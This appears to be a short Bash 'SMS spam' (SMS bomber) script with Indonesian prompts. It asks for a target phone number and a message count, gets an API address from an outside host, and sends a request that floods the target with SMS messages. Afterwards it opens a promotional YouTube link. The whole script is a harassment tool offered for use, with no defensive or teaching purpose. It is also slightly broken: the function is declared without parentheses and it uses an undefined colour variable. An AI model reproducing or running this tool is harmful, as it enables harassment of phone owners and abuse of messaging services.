ijo="\033[1;32m"
kuning="\033[1;33m"
ungu="\033[1;34m"
merah="\033[1;31m"
putih="\033[1;37m"
cyan="\033[1;36m"
pink="\033[1;35m"
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
spam{
clear
toilet -f future "  SPAM SMS " | lolcat
echo
echo "Masukkan Nomor Target!" | lolcat
echo $ungu"("$ijo"Ex :"$cyan"0812xxxxxxxx"$ungu")"$kuning
read target
echo
echo $cyan"Jumlah Sms Yang DiKirimkan!"$kuning
read paket
echo
echo $kuning"Apakah Nomor Target Benar "$red":"$target $kuning"? "
echo $kuning"Sms Yang DiKirimkan Hanya "$red":"$paket $kuning"? "
echo
echo $ungu"["$ijo"Y"$ungu"/"$ijo"N"$ungu"] "
read confirm
echo
if [ $confirm = "Y" ] || [ $confirm = "y" ]; then
clear
echo $ungu"["$ijo"!"$ungu"] "$cyan"JANGAN CLOSE APLIKASI SEBELUM SPAM BERAKHIR "
echo $putih"==============================================="
target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
echo $ungu"["$ijo"!"$ungu"] "$ijo"SPAM BERHASIL DI KIRIMKAN :) "
xdg-open https://youtube.com/BlackCodersAnonymous
else
echo $merah "TERJADI KESALAHAN! "
fi
